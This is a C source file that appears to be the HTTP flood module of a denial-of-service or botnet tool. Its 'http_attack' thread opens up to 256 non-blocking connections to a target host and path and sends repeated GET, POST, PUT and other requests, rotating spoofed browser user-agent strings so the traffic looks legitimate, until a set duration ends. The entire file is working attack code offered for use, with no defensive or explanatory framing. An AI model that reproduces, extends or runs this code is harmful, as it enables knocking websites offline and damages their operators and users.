#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <ctype.h>

#include "http_attack.h"
#include "../headers/protocol.h"

#define MAX_CONNECTIONS 256
#define MAX_REQUEST_SIZE 2048

typedef enum {
    HTTP_GET = 0,
    HTTP_POST,
    HTTP_HEAD,
    HTTP_PUT,
    HTTP_DELETE,
    HTTP_PATCH,
    HTTP_OPTIONS,
    HTTP_METHOD_COUNT
} http_method_t;

static const char* METHOD_NAMES[] = {
    "GET", "POST", "HEAD", "PUT", "DELETE", "PATCH", "OPTIONS"
};

static const char* USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0"
};
#define NUM_USER_AGENTS (sizeof(USER_AGENTS) / sizeof(USER_AGENTS[0]))

static void set_socket_options(int sock) {
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
}

static const char* get_random_user_agent(void) {
    return USER_AGENTS[rand() % NUM_USER_AGENTS];
}

static int parse_method_option(const char* method_str) {
    if (!method_str) return -1;
    
    char lower[16] = {0};
    int i;
    for (i = 0; i < 15 && method_str[i]; i++) {
        lower[i] = tolower(method_str[i]);
    }
    
    if (strcmp(lower, "get") == 0) return HTTP_GET;
    if (strcmp(lower, "post") == 0) return HTTP_POST;
    if (strcmp(lower, "head") == 0) return HTTP_HEAD;
    if (strcmp(lower, "put") == 0) return HTTP_PUT;
    if (strcmp(lower, "delete") == 0) return HTTP_DELETE;
    if (strcmp(lower, "patch") == 0) return HTTP_PATCH;
    if (strcmp(lower, "options") == 0) return HTTP_OPTIONS;
    
    return -1;
}

static int build_request(char* buf, size_t buf_size, http_method_t method, 
                         const char* host, const char* path, const char* user_agent) {
    int len = 0;
    
    switch (method) {
        case HTTP_POST:
        case HTTP_PUT:
        case HTTP_PATCH:
            len = snprintf(buf, buf_size,
                "%s %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Connection: keep-alive\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 16\r\n"
                "Accept: */*\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "\r\n"
                "data=random_data",
                METHOD_NAMES[method], path, host, user_agent);
            break;
            
        case HTTP_OPTIONS:
            len = snprintf(buf, buf_size,
                "%s %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Connection: keep-alive\r\n"
                "Access-Control-Request-Method: POST\r\n"
                "Origin: http://%s\r\n"
                "\r\n",
                METHOD_NAMES[method], path, host, user_agent, host);
            break;
            
        default:
            len = snprintf(buf, buf_size,
                "%s %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Connection: keep-alive\r\n"
                "Accept: */*\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "\r\n",
                METHOD_NAMES[method], path, host, user_agent);
            break;
    }
    
    return len;
}

void* http_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = params->target_addr.sin_port;
    target_addr.sin_addr = params->target_addr.sin_addr;

    attack_option* domain_opt = find_option(params, OPT_DOMAIN);
    char host[256];
    if (domain_opt && domain_opt->data && domain_opt->len > 0) {
        int len = domain_opt->len < 255 ? domain_opt->len : 255;
        memcpy(host, domain_opt->data, len);
        host[len] = '\0';
    } else {
        strncpy(host, inet_ntoa(params->target_addr.sin_addr), sizeof(host) - 1);
        host[sizeof(host) - 1] = '\0';
    }

    attack_option* path_opt = find_option(params, OPT_HTTP_PATH);
    char path[512] = "/";
    if (path_opt && path_opt->data && path_opt->len > 0) {
        int len = path_opt->len < 511 ? path_opt->len : 511;
        memcpy(path, path_opt->data, len);
        path[len] = '\0';
    }

    attack_option* method_opt = find_option(params, OPT_HTTP_METHOD);
    int fixed_method = -1;
    if (method_opt && method_opt->data && method_opt->len > 0) {
        char method_str[32] = {0};
        int len = method_opt->len < 31 ? method_opt->len : 31;
        memcpy(method_str, method_opt->data, len);
        fixed_method = parse_method_option(method_str);
    }

    int sockets[MAX_CONNECTIONS] = {0};
    int active_sockets = 0;
    
    srand(time(NULL) ^ (unsigned int)getpid());
    time_t end_time = time(NULL) + params->duration;
    struct timeval last_cleanup = {0, 0};

    while (params->active && time(NULL) < end_time) {
        while (active_sockets < MAX_CONNECTIONS) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) break;
            
            set_socket_options(sock);
            
            int ret = connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
            if (ret < 0 && errno != EINPROGRESS) {
                close(sock);
                continue;
            }
            
            sockets[active_sockets++] = sock;
        }

        for (int i = 0; i < active_sockets; i++) {
            int sock = sockets[i];
            if (sock <= 0) continue;

            http_method_t method;
            if (fixed_method >= 0 && fixed_method < HTTP_METHOD_COUNT) {
                method = (http_method_t)fixed_method;
            } else {
                method = (http_method_t)(rand() % 3);
            }

            char request[MAX_REQUEST_SIZE];
            int req_len = build_request(request, sizeof(request), method, 
                                         host, path, get_random_user_agent());

            ssize_t sent = send(sock, request, req_len, MSG_NOSIGNAL | MSG_DONTWAIT);
            
            if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                close(sock);
                sockets[i] = sockets[--active_sockets];
                sockets[active_sockets] = 0;
                i--;
                continue;
            }
            
            char discard[1024];
            recv(sock, discard, sizeof(discard), MSG_DONTWAIT);
        }
    
        struct timeval now;
        gettimeofday(&now, NULL);
        if (now.tv_sec - last_cleanup.tv_sec >= 1) {
            for (int i = 0; i < active_sockets; i++) {
                if (sockets[i] <= 0) continue;
                
                char test;
                if (recv(sockets[i], &test, 1, MSG_PEEK | MSG_DONTWAIT) == 0) {
                    close(sockets[i]);
                    sockets[i] = sockets[--active_sockets];
                    sockets[active_sockets] = 0;
                    i--;
                }
            }
            last_cleanup = now;
        }
    }

    for (int i = 0; i < active_sockets; i++) {
        if (sockets[i] > 0) close(sockets[i]);
    }
    
    return NULL;
}
